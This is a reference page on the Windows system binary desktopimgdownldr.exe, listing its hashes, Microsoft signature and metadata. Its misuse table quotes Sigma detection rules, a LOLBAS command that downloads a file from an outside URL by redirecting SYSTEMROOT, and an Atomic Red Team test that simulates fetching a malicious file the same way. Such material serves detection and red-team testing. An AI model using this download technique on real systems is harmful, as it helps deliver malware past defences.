---
title: desktopimgdownldr.exe | desktopimgdownldr.exe
excerpt: What is desktopimgdownldr.exe?
---

# desktopimgdownldr.exe 

* File Path: `C:\Windows\system32\desktopimgdownldr.exe`
* Description: desktopimgdownldr.exe

## Hashes

Type | Hash
-- | --
MD5 | `CB101C0F6228B7679BE6EDC2DBA3D62A`
SHA1 | `7245C7D2BA519B8CACA25A6FFC76945D182BC23E`
SHA256 | `68EC8D58AA6C6C5B93768E9B95318C97A04403A05775EB0870A7E94E1C8AF8E2`
SHA384 | `03C3A9208190F8A10CAABE5611C6FA1E386A2C10EC0B48BCA5F3CE02A87AD3641B4D5064EB935E0B29D9578D62DA4FE7`
SHA512 | `2FA84638081CD89649D326CB873EB3029544FD0809BD6E38F0EC07638373AD860800417CF84715A95F620E1D4E34FF4E830173F50AFAC2339FDB93A465E70B1C`
SSDEEP | `1536:vqJSn84Flmp63POHFehDkEni/P9nk4VQKZpzvmNq4GL/ZiJsvoFKXQ6d:j9c7EnE1kDKZVKGLBiJ6SKA6d`
IMP | `4497ED51F6847EDEE6F31E6DE69B6378`
PESHA1 | `50281899FA888F9473B8F086776CDCE9DF43DCDF`
PE256 | `C6C9114F9D0931D6EA81921236864320BB0EBE6AE1E7A3A7AF4A41CD72D62669`

## Runtime Data

### Loaded Modules:

Path |
-- |
C:\Windows\system32\desktopimgdownldr.exe |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `33000002EC6579AD1E670890130000000002EC`
* Thumbprint: `F7C2F2C96A328C13CDA8CDB57B715BDEA2CBD1D9`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: desktopimgdownldr.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.746 (WinBuild.160101.0800)
* Product Version: 10.0.19041.746
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/74
* VirusTotal Link: https://www.virustotal.com/gui/file/68ec8d58aa6c6c5b93768e9b95318c97a04403a05775eb0870a7e94e1c8af8e2/detection


## Possible Misuse

*The following table contains possible examples of `desktopimgdownldr.exe` being misused. While `desktopimgdownldr.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/win_susp_desktopimgdownldr_file.yml) | `title: Suspicious Desktopimgdownldr Target File`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/win_susp_desktopimgdownldr_file.yml) | `description: Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_copy_system32.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_copy_system32.yml) | `description: Detects a suspicious copy command that copies a system program from System32 to another directory on disk - sometimes used to use LOLBINs like certutil or desktopimgdownldr to a different location with a different name`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_desktopimgdownldr.yml) | `title: Suspicious Desktopimgdownldr Command`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_desktopimgdownldr.yml) | `description: Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `Name: Desktopimgdownldr.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `- Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `- Path: c:\windows\system32\desktopimgdownldr.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `- IOC: desktopimgdownldr.exe that creates non-image file`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #4: Bits download using desktopimgdownldr.exe (cmd) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #4: Bits download using desktopimgdownldr.exe (cmd) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | - [Atomic Test #4 - Bits download using desktopimgdownldr.exe (cmd)](#atomic-test-4---bits-download-using-desktopimgdownldrexe-cmd) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | ## Atomic Test #4 - Bits download using desktopimgdownldr.exe (cmd) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | This test simulates using desktopimgdownldr.exe to download a malicious file | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | and not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/ | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1197.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md) | set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


